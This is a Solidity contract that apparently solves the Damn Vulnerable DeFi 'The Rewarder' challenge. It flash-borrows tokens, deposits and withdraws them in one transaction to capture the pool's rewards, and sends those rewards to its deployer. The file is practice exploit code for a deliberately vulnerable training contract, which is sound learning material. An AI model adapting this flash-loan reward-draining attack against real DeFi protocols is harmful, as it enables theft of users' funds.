// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "../DamnValuableToken.sol";
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "./RewardToken.sol";
import "hardhat/console.sol";


contract HackTheRewarder {
    DamnValuableToken private token;
    FlashLoanerPool private flashLoaner;
    TheRewarderPool private rewarderpool;
    RewardToken private rewardToken;
    address private OWNER;

    constructor(address _token, address _flashLoaner, address _rewarderPool, address _rewardToken) {
        token = DamnValuableToken(_token);
        flashLoaner = FlashLoanerPool(_flashLoaner);
        rewarderpool = TheRewarderPool(_rewarderPool);
        rewardToken = RewardToken(_rewardToken);
        OWNER = msg.sender;
    }

    function receiveFlashLoan(uint256 borrowAmount) external {
        token.approve(address(rewarderpool), borrowAmount);
        rewarderpool.deposit(borrowAmount);
        rewarderpool.withdraw(borrowAmount);
        token.transfer(msg.sender, borrowAmount);
    }

    function hack(uint256 borrowAmount) external {
        flashLoaner.flashLoan(borrowAmount);
    }

    function withdrawAllTokens() external {
        require(msg.sender == OWNER, "not authorized");
        uint256 tokens = rewardToken.balanceOf(address(this));
        rewardToken.transfer(OWNER, tokens);
    }
}